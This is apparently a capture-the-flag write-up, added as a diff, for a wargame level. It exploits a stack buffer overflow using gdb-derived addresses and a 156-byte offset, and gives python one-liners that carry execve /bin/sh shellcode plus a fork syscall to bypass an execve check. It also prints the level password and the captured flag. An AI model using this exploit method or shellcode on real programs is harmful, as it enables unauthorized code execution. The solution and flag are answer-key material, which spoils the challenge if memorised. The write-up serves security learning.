@@ -1,0 +1,24 @@
+level04 : kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+process :
+      - We got a binaire that take an input user in a buffer of size 128 "s[128]"
+      - We know that we can overflow by this buffer
+      - We find the adress of s[128] by gdb
+         gdb ./level04
+         disas main = 0x080486e2 <+26>	lea    0x20(%esp),%ebx
+         we need to break at the lea declaration (s[128]) b *0x080486e2
+         we print where lea adress is  
+            p/x $esp +0x20 = 0xffffd670 this is our adress for s[128]
+      - we find the offset where we start to re write the eip (return's adress) with gdb
+         we know that eip is at ebp + 4
+         so we do (ebp + 4) - esp + 0x20 = eip adress
+            p/x ($ebp + 4) - ($esp + 0x20) = 0x9c = 156
+         the offset is a 156 octets after the adress of s[128]
+      - we can build our payload = NOP SLED + SHELLCODE + PADDING TO EIP + ADRESS OF S[128]
+         python -c 'print("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 35 + "\x90\xd6\xff\xff")' > /tmp/level04
+      - cat /tmp/level04 - | ./level04 
+         but fail because the main got a security that check if the child use exceve()
+         So before ou shellcode we place a fork() and the second child we launch our shellcode
+      - python -c 'print("\x90" * 94 + "\x31\xc0\xb0\x02\xcd\x80\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 35 + "\x90\xd6\xff\xff")' > /tmp/level04
+         - \x31\xc0\xb0\x02\xcd\x80 it's the asm code for sys_call(2) the fork function
+      - Get the flag : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
